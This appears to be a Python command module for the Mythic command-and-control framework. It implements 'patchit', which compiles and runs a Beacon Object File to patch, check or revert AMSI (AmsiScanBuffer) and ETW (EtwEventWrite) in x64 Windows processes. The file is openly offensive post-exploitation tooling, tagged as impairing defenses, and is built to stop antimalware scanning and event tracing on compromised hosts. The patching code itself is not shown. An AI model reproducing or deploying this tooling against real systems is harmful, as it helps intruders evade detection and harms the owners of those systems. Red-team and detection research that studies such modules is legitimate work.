from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json
import binascii
import cmd 
import struct
import os
import subprocess



class OfArg:
    def __init__(self, arg_data, arg_type):
        self.arg_data = arg_data
        self.arg_type = arg_type

def generateWString(arg):
    return OfArg(arg.encode('utf-16le') + b'\x00\x00', 0)

def generateString(arg):
    return OfArg(arg.encode('ascii') + b'\x00', 0)

def generate32bitInt(arg):
    return OfArg(struct.pack('<I', int(arg)), 1)

def generate16bitInt(arg):
    return OfArg(struct.pack('<H', int(arg)), 2)

def dobinarystuff(arg):
    return OfArg(arg)

def SerialiseArgs(OfArgs):
    output_bytes = b''
    for of_arg in OfArgs:
        output_bytes += struct.pack('<I', of_arg.arg_type)
        output_bytes += struct.pack('<I', len(of_arg.arg_data))
        output_bytes += of_arg.arg_data
    return output_bytes

class PatchItArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="action",
                type=ParameterType.ChooseOne,
                description="Action to perform",
                choices=["check", "all", "amsi", "etw", "revertAll", "revertAmsi", "revertEtw"],
                default_value="check",
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)
        else:
            self.args["action"].value = self.command_line

            
    
    async def parse_dictionary(self, dictionary):
        self.load_args_from_dictionary(dictionary)

class PatchItCommand(CommandBase):
    cmd = "patchit"
    needs_admin = False
    help_cmd = """All-in-one to patch, check and revert AMSI and ETW for x64 process
Available Commands:" .
Check if AMSI & ETW are patched:      patchit check
Patch AMSI and ETW:                   patchit all
Patch AMSI (AmsiScanBuffer):          patchit amsi
Patch ETW (EtwEventWrite):            patchit etw
Revert patched AMSI & ETW:            patchit revertAll
Revert patched AMSI:                  patchit revertAmsi
Revert patched ETW:                   patchit revertEtw
Note: check command only compares first 4 lines of addresses of functions"""
    description = """All-in-one to patch, check and revert AMSI and ETW for x64 process"""
    version = 1
    script_only = True
    supported_ui_features = ["T1562.001"]
    author = "@ScriptIdiot"
    argument_class = PatchItArguments
    attackmapping = []
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
        builtin=False,
        load_only=True
    )


    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        arch = taskData.Callback.Architecture


        if(arch=="x86"):
            raise Exception("BOF's are currently only supported on x64 architectures")

        bof_path = f"/Mythic/athena/mythic/agent_functions/misc_bofs/patchit/patchit.{arch}.o"
        if(os.path.isfile(bof_path) == False):
            await self.compile_bof("/Mythic/athena/mythic/agent_functions/misc_bofs/patchit/")

        # Read the COFF file from the proper directory
        with open(bof_path, "rb") as coff_file:
            encoded_file = base64.b64encode(coff_file.read())

        # Upload the COFF file to Mythic, delete after using so that we don't have a bunch of wasted space used
        file_resp = await MythicRPC().execute("create_file",
                                    task_id=taskData.Task.ID,
                                    file=encoded_file,
                                    delete_after_fetch=True)
        encoded_args = ""
        OfArgs = []

        action = str(taskData.args.get_arg("action")).lower()
        #check - 1
        #all - 2
        #amsi - 3
        #etw - 4
        #revertAll - 5
        #revertAmsi - 6
        #revertetw - 7

        if action == "check":
            OfArgs.append(generate32bitInt(1))
        elif action == "all":
            OfArgs.append(generate32bitInt(2))
        elif action == "amsi":
            OfArgs.append(generate32bitInt(3))
        elif action == "etw":
            OfArgs.append(generate32bitInt(4))
        elif action == "revertall":
            OfArgs.append(generate32bitInt(5))
        elif action == "revertamsi":
            OfArgs.append(generate32bitInt(6))
        elif action == "revertetw":
            OfArgs.append(generate32bitInt(7))
        else:
            raise Exception("Invalid action specified")

        encoded_args = base64.b64encode(SerialiseArgs(OfArgs)).decode()
        resp = await MythicRPC().execute("create_subtask_group", tasks=[
            {"command": "coff", "params": {"coffFile":file_resp.response["agent_file_id"], "functionName":"go","arguments": encoded_args, "timeout":"60"}},
            ], 
            subtask_group_name = "coff", parent_task_id=taskData.Task.ID)
        
        return response

    async def process_response(self, response: AgentResponse):
        pass

    async def compile_bof(self, bof_path):
        p = subprocess.Popen(["make"], cwd=bof_path)
        p.wait()
        streamdata = p.communicate()[0]
        rc = p.returncode
        if rc != 0:
            raise Exception("Error compiling BOF: " + str(streamdata))
